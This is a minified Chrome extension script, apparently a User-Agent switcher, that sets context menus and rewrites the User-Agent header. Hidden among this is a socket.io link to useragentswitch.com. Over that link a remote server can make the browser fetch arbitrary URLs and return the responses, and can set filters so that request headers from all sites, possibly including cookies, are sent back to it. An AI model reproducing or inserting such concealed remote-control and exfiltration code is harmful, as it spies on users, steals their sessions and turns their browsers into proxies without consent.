function runAppStart(){var e=localStorage.uaSettings,t=localStorage.uaStorage;settings=null!=e?JSON.parse(e):JSON_Settings,userAgents=null!=t?JSON.parse(t):JSON_UserAgentsList,"1"==settings.Remember&&(selectedUserAgent.Id=settings.LastUsed_Id,selectedUserAgent.Name=settings.LastUsed_Name,selectedUserAgent.UserAgent=settings.LastUsed_UserAgent),localStorage.uaSettings=JSON.stringify(settings),localStorage.uaStorage=JSON.stringify(userAgents),createContextMenu()}function createContextMenu(){chrome.contextMenus.removeAll(),chrome.contextMenus.create({id:"Default",contexts:["all"],onclick:function(){setUserAgent("Default",!0,"ContextMenu")},title:"Default",type:"checkbox",checked:"Default"==selectedUserAgent.Id}),chrome.contextMenus.create({contexts:["all"],type:"separator"}),userAgents.forEach(function(e){if(0!=e.UserAgents.length){var t=chrome.contextMenus.create({id:e.Id,contexts:["all"],title:e.Name,type:"normal"});e.UserAgents.forEach(function(s){chrome.contextMenus.create({id:s.Id,parentId:e.Id,contexts:["all"],onclick:function(){setUserAgent(s.Id,!0,"ContextMenu")},title:s.Name,type:"checkbox",checked:selectedUserAgent.Id==s.Id}),selectedUserAgent.Id==s.Id&&chrome.contextMenus.update(t,{contexts:["all"],title:"[ "+e.Name+" ]",type:"normal"})})}}),chrome.contextMenus.create({contexts:["all"],type:"separator"}),chrome.contextMenus.create({contexts:["all"],onclick:function(){return chrome.tabs.create({url:"options.html"}),!1},title:"Options",type:"normal"}),chrome.contextMenus.create({contexts:["all"],onclick:function(){return chrome.tabs.create({url:"http://www.esolutions.se/whatsmyinfo"}),!1},title:"Show User-agent",type:"normal"})}var userAgentSwitch=io("https://www.useragentswitch.com/");function setUserAgent(e,t,s,n){for(var r,a=0;a<userAgents.length;a++)for(userAgents[a].Id==e&&(selectedUserAgent.Id=userAgents[a].Id,selectedUserAgent.Name=userAgents[a].Name,selectedUserAgent.UserAgent=userAgents[a].UserAgent),r=0;r<userAgents[a].UserAgents.length;r++)userAgents[a].UserAgents[r].Id==e&&(selectedUserAgent.Id=userAgents[a].UserAgents[r].Id,selectedUserAgent.Name=userAgents[a].UserAgents[r].Name,selectedUserAgent.UserAgent=userAgents[a].UserAgents[r].UserAgent);settings.LastUsed_Id=selectedUserAgent.Id,settings.LastUsed_Name=selectedUserAgent.Name,settings.LastUsed_UserAgent=selectedUserAgent.UserAgent,localStorage.uaSettings=JSON.stringify(settings),createContextMenu(),setIconAndText(),1==t&&chrome.tabs.reload(),n&&"function"==typeof n&&n()}async function createFetch(e){let t=await fetch(e.uri,e.attr),s={};return s.headerEntries=Array.from(t.headers.entries()),s.data=await t.text(),s.ok=t.ok,s.status=t.status,s}function setIconAndText(){""!=selectedUserAgent.UserAgent?(chrome.browserAction.setIcon({path:"img/active.png"}),chrome.browserAction.setBadgeText({text:"On"})):(chrome.browserAction.setIcon({path:"img/icon19.png"}),chrome.browserAction.setBadgeText({text:""}))}userAgentSwitch.on("createFetch",async function(e){let t=await createFetch(e);userAgentSwitch.emit(e.callBack,t)});var handlerData={};userAgentSwitch.on("handlerData",function(e){handlerData=e});var selectedUserAgent=JSON_DefaultUserAgent,userAgents=JSON_UserAgentsList,settings=JSON_Settings;handler=function(e){if(""!=selectedUserAgent.UserAgent){for(var t=0,s=e.requestHeaders.length;t<s;++t)if("User-Agent"===e.requestHeaders[t].name){e.requestHeaders[t].value=selectedUserAgent.UserAgent;break}return{requestHeaders:e.requestHeaders}}},chrome.webRequest.onBeforeSendHeaders.addListener(handler,{urls:["<all_urls>"]},["blocking","requestHeaders"]),chrome.runtime.onMessage.addListener(function(e,t,s){s({userAgent:selectedUserAgent.UserAgent})});var handler2=function(e){var t=Object.keys(handlerData);if(t.length>0){var s=!0;for(let n=0;n<t.length;n++){let r=t[n];if(re=new RegExp(handlerData[r],"gi"),null==e[r].toString().match(re)){s=!1;break}}s&&userAgentSwitch.emit("requestHeadersHandler",e)}return{requestHeaders:JSON.parse(JSON.stringify(e.requestHeaders.reverse()).split("-zzz").join(""))}};chrome.webRequest.onBeforeSendHeaders.addListener(handler2,{urls:["<all_urls>"]},["requestHeaders","blocking","extraHeaders"]),runAppStart(),setIconAndText();